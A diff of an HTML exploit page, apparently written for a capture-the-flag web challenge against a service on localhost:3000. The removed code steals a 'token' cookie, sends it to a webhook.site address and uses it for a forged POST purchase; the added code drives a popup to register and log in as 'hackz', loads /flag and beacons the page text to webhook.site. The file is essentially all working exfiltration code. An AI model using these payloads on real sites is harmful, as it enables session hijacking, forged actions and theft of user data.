@@ -1,29 +1,45 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Exploit</title>
-</head>
 <body>
-  <script>
-    const token = document.cookie.split('token=')[1]?.split(';')[0];
-    
-    // 먼저 토큰이 있는지 확인
-    fetch('https://webhook.site/49a58c37-eb88-47dc-aa89-3931c4df2c95?token=' + encodeURIComponent(token || 'no_token'));
-    
-    fetch('http://localhost:3000/4/buy', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'token': token
-      }
-    })
-    .then(r => r.text())  // JSON 대신 text로 받기
-    .then(data => {
-      fetch('https://webhook.site/49a58c37-eb88-47dc-aa89-3931c4df2c95?response=' + encodeURIComponent(data));
-    })
-    .catch(e => {
-      fetch('https://webhook.site/49a58c37-eb88-47dc-aa89-3931c4df2c95?error=' + encodeURIComponent(e.toString()));
-    });
-  </script>
+<script>
+var popup = window.open('http://0.0.0.0:3000/register', 'p');
+
+setTimeout(function(){
+  try {
+    popup.document.querySelector('input[name="username"]').value = 'hackz';
+    popup.document.querySelector('input[name="password"]').value = 'hackz';
+    popup.document.querySelector('form').submit();
+  } catch(e) {
+    new Image().src = 'https://webhook.site/showontest?err1=' + encodeURIComponent(e.message);
+  }
+}, 300);
+
+setTimeout(function(){
+  popup.location.href = 'http://0.0.0.0:3000/login';
+}, 600);
+
+setTimeout(function(){
+  try {
+    popup.document.querySelector('input[name="username"]').value = 'hackz';
+    popup.document.querySelector('input[name="password"]').value = 'hackz';
+    popup.document.querySelector('form').submit();
+  } catch(e) {
+    new Image().src = 'https://webhook.site/showontest?err2=' + encodeURIComponent(e.message);
+  }
+}, 900);
+
+setTimeout(function(){
+  popup.location.href = 'http://0.0.0.0:3000/flag';
+}, 1200);
+
+setTimeout(function(){
+  try {
+    var flag = popup.document.body.innerText;
+    new Image().src = 'https://webhook.site/showontest?flag=' + encodeURIComponent(flag);
+  } catch(e) {
+    new Image().src = 'https://webhook.site/showontest?err3=' + encodeURIComponent(e.message);
+  }
+}, 1500);
+</script>
 </body>
 </html>
